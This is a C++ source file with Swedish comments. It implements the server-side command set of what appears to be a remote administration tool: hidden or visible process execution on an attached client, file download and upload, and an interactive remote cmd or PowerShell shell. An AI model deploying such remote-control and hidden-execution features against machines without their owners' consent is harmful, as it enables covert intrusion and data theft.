#pragma once
#include "precompile.h"
#include "server.h"
#include "utility.h"
func_map server::get_client_commands()
{
	return {

		{"detach", [&](std::string args) { // återgå till server kommandon
			argument_parser(
				[&](std::string value) {
					console_log.Log<LOG_VERBOSE>(logger() << str_time() << " detaching from " << attached->name << "\n");
					attached = nullptr; // peka på null itsället för på en klient
					console.set_prompt(default_prompt); // sätt tillbaka prompt meddelandet
					console.set_functions(utility::add(server_commands, global_commands)); // sätt tillbaka server funktionerna
			}, args, "detach");
		}},

		{"process", [&](std::string args) { // skapa en process hos klienten
			argument_parser([&](std::string value) {
				message msg;
				// parsa input args för att ta reda på om man vill att processen ska vara synlig eller inte
				auto [arg1, arg2] = utility::ArgSplit(args, ' ');
				if (!arg1.empty()) {
					std::string file;
					if (arg1 == "-p" || arg2 == "-p") { // om användaren vill välja fil
						if (!pick_file("C:\\", file)) { // låt användaren välja fil och sätt path till file buffer som passas in som referens i funktionen
							console << "(Status) Failed: Pick Aborted\n"; // om användaren avbröt filväljning eller klienten förlorade anslutning 
							return;
						}
					}

					if (arg1 == "-v" || arg1 == "-h") { // om användaren specifierade synlighet argumentet
						msg.identifier = "process" + arg1;
						msg.data = arg2;
					}
					else { // om användaren inte gjorde det
						msg.identifier = "process-v";
						msg.data = args;
					}

					if (!file.empty()) { // om man valde en fil så sätt datan till path
						msg.data = file;
					}

					console_log.Log<LOG_INFO>(logger() << str_time() << " Executing\n" << str_time() << "  File:" << file << "\n");

					if (send(*attached, msg)) { // skicka förfrågan 
						console << "Executing " << msg.data;
						// om förfrågan kom fram, vänta på svar
						packet response = wait_response("response|" + msg.identifier, attached);
						if (response.data == "SUCCESS") { // skapde processen
							console << "(Status) Success: Executed " << file << " on klient\n";
						}
						else { // kunde inte skapa processen
							console << "(Status) Failed:" << " -> Error[" << std::error_code(std::stoi(response.data), std::system_category()).message() << "]\n";
						}
						delete_packet(response);
					}
					else { // kunde inte skicka meddelande
						console << "(Status) Failed: could not send request " << args << "\n";
					}
				}
				else {
					 // om det inte fanns något argument
					console << "The syntax of the command is incorrect. try process -h\n";
					return;
				}
			}, args, "process");
		}},

		{"help", [&](std::string args) { // visa hjälp
			console << "\n";
			for (auto [func, doc] : klient_help) { // skriver ut alla help dokument
				console << func << " - " << doc << "\n";
			}
			console << "\n";
		}},

		{"download", [&](std::string args) { // ladda ner en fil från klienten
			argument_parser([&](std::string value) {

				//skapa en mapp för nedladdningar från klienten
				if (!std::filesystem::is_directory("Downloads_" + attached->name) || std::filesystem::exists("Downloads_" + attached->name)) {
					console_log.Log<LOG_INFO>(logger() << str_time() << " create_dir(" << "Downloads_" << attached->name << ") - ok\n");
					std::filesystem::create_directory("Downloads_" + attached->name);
				}

				message msg{"download", ""};
				std::string file;
				std::string drop_folder = std::filesystem::current_path().string() + "\\Downloads_" + attached->name;
				if (!args.empty() && args == "-p") {  // Om man vill välja en fil att ladda ner
					if (pick_file("C:\\", file)) {// låt användaren välja fil och sätt path till buffer som passas in som referens i funktionen
						msg.data = file;
						pick_folder_local("C:\\", drop_folder);
					}
					else {  // om användaren avbröt filväljning eller klienten förlorade anslutning 
						console << "(Status) Failed: Pick Aborted\n";
						return;
					}
				}
				else if (!args.empty()) { // annars är det manuella argument
					auto [file, folder_path] = utility::ArgSplit(args, ' '); // splita argument med delimit ' '
					msg.data = file;
					if (std::filesystem::is_directory(folder_path)) { // om folder_path är en mapp
						drop_folder = folder_path;
					}
					else if(!folder_path.empty()){
						console << "(Status) Failed: The folder \"" << folder_path << "\" does not exist!\n";
						return;
					}

				}
				else { // om det inte fanns något argument
					console << "The syntax of the command is incorrect. try -h\n";
					return;
				}

				console_log.Log<LOG_INFO>(logger() << str_time() << " Downloading\n" << str_time() << "  From:" << file << "\n" << str_time() << "  To:" << drop_folder << " \n");

				if (send(*attached, msg)) { // skicka förfrågan 
					packet response = wait_response("response|" + msg.identifier, attached); // vänta på svar
					if (response.data != "FAIL") { // om svaret inte är FAIL måste filen finnas på klienten
						
						std::filesystem::path path_from_client = msg.data;

						drop_folder += "\\" + path_from_client.filename().string();

						std::ofstream file(drop_folder, std::ios::binary); // öppna filen i binärt skrivande
						file << response.data; // skriv fildatan som man tog emot
						file.close(); // stäng filen

						console << "(Status) Success: Downloaded to " << drop_folder << "\n";
					}
					else {
						console << "(Status) Failed: No such file\n";
					}
					delete_packet(response); // ta bort fil packetet
				}
				else { // kunde inte skicka meddelande
					console << "(Status) Failed: could not send request " << args << "\n";
				}
			}, args, "download");
		}},

		{"upload", [&](std::string args) { // ladda upp en fil till klienten
			argument_parser([&](std::string value) {
				message msg{"upload", ""};
				std::string upload_file;
				std::string upload_folder;
				if (!args.empty() && args == "-p") {  // Om man vill välja en fil att ladda up
					if (pick_file_local("C:\\", upload_file) && pick_folder("C:\\", upload_folder)) {// låt användaren välja fil och mapp
						msg.data = upload_file + "|" + upload_folder;
					}
					else {  // om användaren avbröt filväljning eller klienten förlorade anslutning 
						console << "(Status) Failed: Pick Aborted\n";
						return;
					}
				}
				else if (!args.empty()) {
					auto [file, folder] = utility::ArgSplit(args, ' ');
					msg.data = file + "|" + folder;
				}
				else { // om det inte fanns något argument
					console << "The syntax of the command is incorrect. try -h\n";
					return;
				}

				console_log.Log<LOG_INFO>(logger() << str_time() << " Uploading\n" << str_time() << "  From:" << upload_file << "\n" << str_time() << "  To:" << upload_folder << " \n");

				if (send(*attached, msg)) { // skicka förfrågan

					packet response = wait_response("upload_status", attached); // vänta på konfirmation

					if (response.data == "OK") {

						std::ifstream file(upload_file, std::ios::binary); // läs in filen binärt

						send(*attached, {"upload-data", std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>())}); // konvertera fil till sträng och skicka

						console << "(Status) Success: Uploaded to " << upload_folder << "\n";
					}
					else {
						console << "(Status) Failed: Bad Folder\n";
					}

				}

			}, args, "upload");
		} },

		{"shell-process", [&](std::string args) {
			std::string shell = args;
			std::string cwd = R"(C:\Windows\System32)";
			message msg{ "shell-init", "" };
			if (args == "cmd") {
				shell = R"(C:\Windows\System32\cmd.exe /K ping 127.0.0.1 -n 5)";
			}
			else if (args == "powershell") {
				shell = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
			}
			else if (!args.empty()) {
				auto [shel, cw] = utility::ArgSplit(args, '|');
				shell = shel;
				cwd = cw;
			}
			else { // om det inte fanns något argument
				console << "The syntax of the command is incorrect. try -h\n";
				return;
			}

			msg.data = shell + "|" + cwd;

			console_log.Log<LOG_INFO>(logger() << str_time() << " Shell-Process-Start\n" << str_time() << "  Process:" << shell  << "\n" << str_time() << "  CWD:" << cwd<< " \n");

			if (send(*attached, msg)) {
				packet response = wait_response("shell-status", attached); // vänta på konfirmation
				
				if (response.data == "OK") {
					delete_packet(response);
					bool alive = true;
					bool ready = false;
					console << "(Status) Success: Shell started\n";

					std::thread read_thread([&] {
						while (alive) {
							packet read_data = wait_response("shell-read", "shell-status", attached);

							if (read_data.id == "shell-read") { // shell-read -> printa
								console << read_data.data;
							}
							else if (read_data.id == "shell-status" ) {// shell-status -> dö
								alive = false;
							}

							delete_packet(read_data);
						}
					});

					while (alive) {
						packet read_data = wait_response("shell-ready", attached);	
						if (read_data.data != "died") {
							std::string console_input = console.input_str(false) + "\n"; // padda process prompten och ta input därifrån
							send(*attached, { "shell-input", console_input });
						}
						else {
							alive = false;
						}
						delete_packet(read_data);
					}

					read_thread.join();
					console << "\n\n(Status) Success Process Exited\n";
				}
				else {
					console << "(Status) Failed: " << response.data << "\n";
					delete_packet(response);
					return;
				}

			}
		}}

	};
}
